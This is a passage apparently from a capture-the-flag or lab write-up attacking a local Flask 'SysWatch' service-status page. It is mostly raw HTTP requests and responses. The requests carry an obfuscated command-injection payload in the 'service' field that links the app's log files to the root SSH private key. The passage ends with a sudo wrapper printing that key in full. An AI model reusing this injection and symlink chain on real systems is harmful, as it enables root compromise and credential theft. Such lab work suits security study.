Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:7777/service-status
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acg94Q.T96J6_LnYvFTdMNsRcKezUqh-Tk
Connection: keep-alive

service=a%7cln%20-sf%20%24%28printf%20%27%5c057root%5c057%5c056ssh%5c057id%5c137ed25519%27%29%20%24%28printf%20%27%5c057opt%5c057syswatch%5c057logs%5c057hop2%5c056log%27%29
```

```shell
HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.3
Date: Sat, 28 Mar 2026 21:18:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2733
Vary: Cookie
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Check System Service Status</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="topbar">
    <div class="brand">SysWatch</div>
    <div class="user">
        <span>admin</span>
        <button class="mode-toggle" id="modeToggle">Toggle Theme</button>
        <a class="logout" href="/logout">Logout</a>
    </div>
</div>

<div class="card">
    <h2>Check System Service Status</h2>
    <form method="post" action="/service-status" id="svcForm" style="display:flex; gap:8px; align-items:center;">
        <input type="text" id="serviceInput" name="service" placeholder="e.g. ssh" value="a|ln -sf $(printf &#39;\057root\057\056ssh\057id\137ed25519&#39;) $(printf &#39;\057opt\057syswatch\057logs\057hop2\056log&#39;)" required pattern="^[A-Za-z0-9_.-]{1,64}$" maxlength="64" autocomplete="off" spellcheck="false" style="flex:1; padding:8px; border-radius:4px; border:1px solid #333; background: var(--bg); color: var(--text);">
        <button type="submit" id="submitBtn" class="download">Check</button>
        <a href="/" class="action">Back to Dashboard</a>
    </form>
    <div id="clientError" class="error" style="display:none; margin-top:8px;">Allowed: letters, numbers, dot, dash, underscore</div>
</div>




<div class="card">
    <h3>Result</h3>
    <div class="log-box"><pre>Unit a.service could not be found.
</pre></div>
    <div style="margin-top:10px;"><a class="action" href="/service-status">Check Another Service</a></div>
    <div style="margin-top:10px;"><a class="action" href="/">Back to Dashboard</a></div>
    </div>


</body>
<script>
const re = /^[A-Za-z0-9_.-]{1,64}$/;
const input = document.getElementById('serviceInput');
const form = document.getElementById('svcForm');
const err = document.getElementById('clientError');
const btn = document.getElementById('submitBtn');
function validate() {
  const v = input.value.trim();
  const ok = re.test(v);
  err.style.display = ok ? 'none' : 'block';
  btn.disabled = !ok;
  return ok;
}
input.addEventListener('input', validate);
form.addEventListener('submit', function(e){ if(!validate()){ e.preventDefault(); }});
</script>
<script>
const k='syswatch-theme';
const prefers=window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';
let t=localStorage.getItem(k)||prefers;
document.documentElement.setAttribute('data-theme', t);
const b=document.getElementById('modeToggle');
if(b){
  b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  b.onclick=function(){
    t=t==='dark'?'light':'dark';
    localStorage.setItem(k,t);
    document.documentElement.setAttribute('data-theme', t);
    b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  };
}
</script>
</html>
```

```shell
POST /service-status HTTP/1.1
Host: localhost:7777
Content-Length: 131
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost:7777
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:7777/service-status
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acg94Q.T96J6_LnYvFTdMNsRcKezUqh-Tk
Connection: keep-alive

service=a%7cln%20-sf%20hop2%24(printf%20%27%5c056log%27)%20%24(printf%20%27%5c057opt%5c057syswatch%5c057logs%5c057hop1%5c056log%27)
```

```shell
HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.3
Date: Sat, 28 Mar 2026 21:18:52 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2708
Vary: Cookie
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Check System Service Status</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="topbar">
    <div class="brand">SysWatch</div>
    <div class="user">
        <span>admin</span>
        <button class="mode-toggle" id="modeToggle">Toggle Theme</button>
        <a class="logout" href="/logout">Logout</a>
    </div>
</div>

<div class="card">
    <h2>Check System Service Status</h2>
    <form method="post" action="/service-status" id="svcForm" style="display:flex; gap:8px; align-items:center;">
        <input type="text" id="serviceInput" name="service" placeholder="e.g. ssh" value="a|ln -sf hop2$(printf &#39;\056log&#39;) $(printf &#39;\057opt\057syswatch\057logs\057hop1\056log&#39;)" required pattern="^[A-Za-z0-9_.-]{1,64}$" maxlength="64" autocomplete="off" spellcheck="false" style="flex:1; padding:8px; border-radius:4px; border:1px solid #333; background: var(--bg); color: var(--text);">
        <button type="submit" id="submitBtn" class="download">Check</button>
        <a href="/" class="action">Back to Dashboard</a>
    </form>
    <div id="clientError" class="error" style="display:none; margin-top:8px;">Allowed: letters, numbers, dot, dash, underscore</div>
</div>




<div class="card">
    <h3>Result</h3>
    <div class="log-box"><pre>Unit a.service could not be found.
</pre></div>
    <div style="margin-top:10px;"><a class="action" href="/service-status">Check Another Service</a></div>
    <div style="margin-top:10px;"><a class="action" href="/">Back to Dashboard</a></div>
    </div>


</body>
<script>
const re = /^[A-Za-z0-9_.-]{1,64}$/;
const input = document.getElementById('serviceInput');
const form = document.getElementById('svcForm');
const err = document.getElementById('clientError');
const btn = document.getElementById('submitBtn');
function validate() {
  const v = input.value.trim();
  const ok = re.test(v);
  err.style.display = ok ? 'none' : 'block';
  btn.disabled = !ok;
  return ok;
}
input.addEventListener('input', validate);
form.addEventListener('submit', function(e){ if(!validate()){ e.preventDefault(); }});
</script>
<script>
const k='syswatch-theme';
const prefers=window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';
let t=localStorage.getItem(k)||prefers;
document.documentElement.setAttribute('data-theme', t);
const b=document.getElementById('modeToggle');
if(b){
  b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  b.onclick=function(){
    t=t==='dark'?'light':'dark';
    localStorage.setItem(k,t);
    document.documentElement.setAttribute('data-theme', t);
    b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  };
}
</script>
</html>
```

Reading `hop1.log` via the `syswatch.sh` wrapper exposed the root `SSH` private key, confirming unrestricted access to any file readable by root.

```shell
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs hop1.log
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAC5IeGvL9E5zPYZe7LhpHMcVRsSsUf9Tbhbt7fJqMKfwAAAJCpWMQqqVjE
KgAAAAtzc2gtZWQyNTUxOQAAACAC5IeGvL9E5zPYZe7LhpHMcVRsSsUf9Tbhbt7fJqMKfw
AAAEAgx+KGKmchYnjPrbBgHwaX9SV9+qcdc5p+kHrSVpwMMALkh4a8v0TnM9hl7suGkcxx
VGxKxR/1NuFu3t8mowp/AAAADHJvb3RAZGV2YXJlYQE=
-----END OPENSSH PRIVATE KEY-----
```
